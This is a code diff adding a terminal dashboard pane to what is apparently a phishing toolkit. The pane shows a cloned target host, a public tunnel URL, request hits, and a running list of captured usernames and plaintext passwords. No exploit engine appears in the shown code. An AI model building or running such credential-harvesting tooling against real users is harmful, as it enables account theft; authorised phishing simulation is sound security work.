@@ -355,6 +355,168 @@ class StatusBar(Static):
         self.render_bar()
 
 
+class ZimPane(Static):
+    """Live campaign rail: hits, credentials, local + public URLs.
+
+    Hidden until `/phish` starts a campaign. The engine pushes events onto
+    a thread-safe queue; the app drains that queue on the 0.25s rail tick
+    and calls ``note()``, so the HTTP thread never touches Textual.
+    """
+
+    DEFAULT_CSS = """
+    ZimPane {
+        display: none;
+        width: 36;
+        height: 100%;
+        padding: 0 1;
+        border-left: heavy $secondary;
+    }
+    ZimPane.visible { display: block; }
+    """
+
+    MAX_HITS = 8
+    MAX_CREDS = 6
+
+    def __init__(self, palette: Palette, **kwargs) -> None:
+        super().__init__(**kwargs)
+        self.palette = palette
+        self.host = ""
+        self.local_url = ""
+        self.public_url = ""
+        self.tunnel_tool = ""
+        self.clone_note = ""
+        self.cloned = False
+        self.alive = False
+        self.hits: list[dict] = []
+        self.creds: list[dict] = []
+
+    def show_campaign(self, host: str) -> None:
+        self.host = host
+        self.local_url = ""
+        self.public_url = ""
+        self.tunnel_tool = ""
+        self.clone_note = "starting…"
+        self.cloned = False
+        self.alive = True
+        self.hits.clear()
+        self.creds.clear()
+        self.add_class("visible")
+        self.render_pane()
+
+    def hide(self) -> None:
+        self.alive = False
+        self.remove_class("visible")
+        self.render_pane()
+
+    def note(self, event: dict) -> None:
+        """Apply one engine event and repaint."""
+        kind = event.get("kind")
+        if kind == "ready":
+            self.host = event.get("host") or self.host
+            self.local_url = event.get("local") or ""
+            self.public_url = event.get("public") or ""
+            self.tunnel_tool = event.get("tool") or ""
+            self.clone_note = event.get("clone") or ""
+            self.cloned = bool(event.get("cloned"))
+            self.alive = True
+        elif kind == "stopped":
+            self.alive = False
+        elif kind == "cred":
+            self.creds.append(event)
+            if len(self.creds) > 40:
+                self.creds = self.creds[-40:]
+            self.hits.append(event)
+            if len(self.hits) > 40:
+                self.hits = self.hits[-40:]
+        elif kind == "hit":
+            self.hits.append(event)
+            if len(self.hits) > 40:
+                self.hits = self.hits[-40:]
+        self.render_pane()
+
+    def apply_palette(self, palette: Palette) -> None:
+        self.palette = palette
+        self.render_pane()
+
+    def render_pane(self) -> None:
+        p = self.palette
+        t = Text()
+        t.append("ZIM-PANE\n", style=f"bold {p.accent}")
+        if not self.host and not self.alive:
+            t.append("idle\n", style=p.dim)
+            self.update(t)
+            return
+
+        t.append("phish  ", style=p.dim)
+        t.append(self.host or "?", style=f"bold {p.primary}")
+        t.append("\n")
+        state = "LIVE" if self.alive else "stopped"
+        t.append("state  ", style=p.dim)
+        t.append(state + "\n", style=f"bold {p.accent}" if self.alive else p.amber)
+
+        if self.clone_note:
+            t.append("clone  ", style=p.dim)
+            note = self.clone_note
+            if len(note) > 28:
+                note = note[:27] + "…"
+            t.append(note + "\n", style=p.primary if self.cloned else p.amber)
+
+        if self.local_url:
+            t.append("local  ", style=p.dim)
+            t.append(self.local_url + "\n", style=p.primary)
+        if self.public_url:
+            t.append("public ", style=p.dim)
+            t.append(self.public_url + "\n", style=f"bold {p.accent}")
+            if self.tunnel_tool:
+                t.append("via    ", style=p.dim)
+                t.append(self.tunnel_tool + "\n", style=p.dim)
+        elif self.alive:
+            t.append("public ", style=p.dim)
+            t.append("none — LAN only\n", style=p.amber)
+
+        t.append("\n")
+        t.append("CREDS", style=f"bold {p.accent}")
+        t.append(f"  {len(self.creds)}\n", style=p.dim)
+        if not self.creds:
+            t.append("  (waiting)\n", style=p.dim)
+        else:
+            for ev in self.creds[-self.MAX_CREDS:]:
+                user = str(ev.get("user") or "?")
+                password = str(ev.get("password") or "")
+                if len(user) > 18:
+                    user = user[:17] + "…"
+                t.append("  ▸ ", style=f"bold {p.red}")
+                t.append(user, style=f"bold {p.primary}")
+                t.append("  ", style=p.dim)
+                t.append(password if password else "(no pass)",
+                         style=p.amber if password else p.dim)
+                t.append("\n")
+
+        t.append("\n")
+        t.append("HITS", style=f"bold {p.accent}")
+        t.append(f"  {len(self.hits)}\n", style=p.dim)
+        if not self.hits:
+            t.append("  (none yet)\n", style=p.dim)
+        else:
+            for ev in self.hits[-self.MAX_HITS:]:
+                method = str(ev.get("method") or "?")
+                path = str(ev.get("path") or "/")
+                if len(path) > 18:
+                    path = path[:17] + "…"
+                mark = "●" if ev.get("kind") == "cred" else "·"
+                style = f"bold {p.red}" if ev.get("kind") == "cred" else p.dim
+                t.append(f"  {mark} ", style=style)
+                t.append(f"{method:<4} ", style=p.primary)
+                t.append(path + "\n", style=p.dim)
+
+        t.append("\n")
+        t.append("/phish stop  to tear down\n", style=p.dim)
+        self.update(t)
+
+    def on_mount(self) -> None:
+        self.render_pane()
+
+
 def _k(n: int) -> str:
     if n >= 1_000_000:
         return f"{n/1_000_000:.1f}M"
